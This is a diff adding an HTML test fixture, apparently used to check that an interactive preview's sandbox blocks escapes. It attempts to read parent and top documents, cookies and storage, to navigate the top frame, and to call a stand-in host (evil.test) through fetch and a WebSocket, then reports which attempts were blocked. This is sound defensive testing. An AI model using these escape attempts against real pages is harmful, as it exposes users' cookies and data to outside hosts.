@@ -1,0 +1,58 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>Hostile artifact</title></head>
+<body>
+<pre id="results" data-testid="results">pending</pre>
+<button id="top-click" onclick="try { top.location.href = '/beacon/top-click'; this.textContent = 'assigned'; } catch (err) { this.textContent = 'blocked:' + err.name; }">Navigate the app</button>
+<form id="form" method="post" action="/beacon/form"><input name="x" value="1"></form>
+<script>
+  // Attempts every escape the interactive preview must deny and reports the
+  // outcome in its own DOM. "blocked:<reason>" is the expected result.
+  const results = {};
+  const attempt = (name, fn) => {
+    try { results[name] = 'ok:' + String(fn()); } catch (err) { results[name] = 'blocked:' + err.name; }
+  };
+  const attemptAsync = async (name, fn) => {
+    try { results[name] = 'ok:' + String(await fn()); } catch (err) { results[name] = 'blocked:' + err.name; }
+  };
+  const violations = [];
+  const blocked = [];
+  document.addEventListener('securitypolicyviolation', (e) => { violations.push(e.effectiveDirective); blocked.push(e.blockedURI); });
+
+  attempt('origin', () => self.origin);
+  attempt('parentDocument', () => parent.document.title);
+  attempt('topDocument', () => top.document.cookie);
+  attempt('frameElement', () => { if (window.frameElement === null) throw new DOMException('null', 'NullFrameElement'); return window.frameElement; });
+  attempt('cookie', () => document.cookie);
+  attempt('localStorage', () => localStorage.getItem('x'));
+  attempt('sessionStorage', () => sessionStorage.getItem('x'));
+  attempt('indexedDB', () => { indexedDB.open('x'); return 'opened'; });
+  attempt('image', () => { new Image().src = '/beacon/img'; throw new DOMException('fire-and-forget', 'Unobservable'); });
+  attempt('sendBeacon', () => { if (!navigator.sendBeacon('/beacon/send', 'x')) throw new DOMException('refused', 'Refused'); return 'queued'; });
+  attempt('download', () => { const a = document.createElement('a'); a.href = 'data:text/plain,stolen'; a.download = 'x.txt'; document.body.appendChild(a); a.click(); throw new DOMException('fire-and-forget', 'Unobservable'); });
+  attempt('nestedFrame', () => { const f = document.createElement('iframe'); f.src = '/beacon/frame'; document.body.appendChild(f); throw new DOMException('fire-and-forget', 'Unobservable'); });
+
+  Promise.all([
+    attemptAsync('fetchSameOrigin', () => fetch('/api/artifacts?probe=hostile').then((r) => r.status)),
+    attemptAsync('fetchExternal', () => fetch('http://evil.test/fetch').then((r) => r.status)),
+    attemptAsync('webSocket', () => new Promise((resolve, reject) => {
+      const ws = new WebSocket('ws://evil.test/ws');
+      ws.onopen = () => resolve('open');
+      ws.onerror = ws.onclose = () => reject(new DOMException('error', 'NetworkError'));
+    })),
+  ]).then(() => {
+    attempt('popup', () => { const w = window.open('/beacon/popup'); if (!w) throw new DOMException('null', 'PopupBlocked'); return 'opened'; });
+    // Opened directly, top is this document, and navigating it is ordinary self-navigation.
+    const framed = window !== top;
+    if (framed) attempt('topNavigation', () => { top.location.href = '/beacon/top'; return 'assigned'; });
+    results.violations = [...new Set(violations)].sort().join(',');
+    // A refused connection looks like a CSP block; only a policy report (Chromium)
+    // or a synchronous SecurityError from the constructor (WebKit) proves the CSP.
+    results.socketBlockedByPolicy = String(results.webSocket === 'blocked:SecurityError' || blocked.some((uri) => uri.startsWith('ws://evil.test')));
+    document.getElementById('results').textContent = JSON.stringify(results);
+    // Last: a permitted form submission would navigate this frame away.
+    if (framed) attempt('form', () => { document.getElementById('form').submit(); return 'submitted'; });
+  });
+</script>
+</body>
+</html>
